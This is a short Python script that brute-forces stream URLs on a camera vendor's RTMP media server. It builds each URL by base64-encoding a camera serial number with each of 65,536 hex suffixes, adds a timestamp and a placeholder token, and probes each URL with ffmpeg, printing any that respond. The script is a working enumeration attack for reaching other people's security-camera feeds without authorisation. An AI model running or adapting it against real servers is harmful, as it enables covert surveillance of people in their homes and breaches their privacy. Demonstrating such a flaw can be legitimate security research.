import base64
import time
import datetime
import subprocess 
import asyncio
from aiortc.contrib.media import MediaPlayer
from tqdm import tqdm

#### Beginning of RTMP String
pre = "rtmp://mediaserver-usa4.eufylife.com/hls"
#### Cameras Serial Number
sn = "T8410P412234253E"
#Arbitrary
mid = "_0_2_"
#####Here

####Function to get UTC as String
def gettime():
    now = datetime.datetime.utcnow()
    t = int(time.mktime(now.timetuple()))
    #### token is just me typing randomly on my keyboard
    return "?time="+str(t)+"&token=asgertsrjyuiyy543rweg"

### Create dynamic progress bar
class ProgressBar:
    def __init__(self, total):
        self.progress_bar = tqdm(total=total)
        
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        pass
    
    def update(self, value):
        self.progress_bar.update(value)

#### Go through all possibilities
with ProgressBar(total=256**2) as progress_bar:
    for i in range(256):
        for j in range(256):
            #### Brute Force Part
            hexcode = hex(i)[2:].zfill(2)+hex(j)[2:].zfill(2)
            payload = sn+mid+hexcode
            bstring = payload.encode('utf-8')
            b64 = base64.b64encode(bstring)
            final = b64.decode('utf-8')
            url = pre+final+gettime()
            ### here
            try:
                subprocess.check_output(['ffmpeg', '-i', url, '-f', 'null', '-'], stderr=subprocess.STDOUT)
                print(url)
            except subprocess.CalledProcessError:
                pass
            progress_bar.update(1)
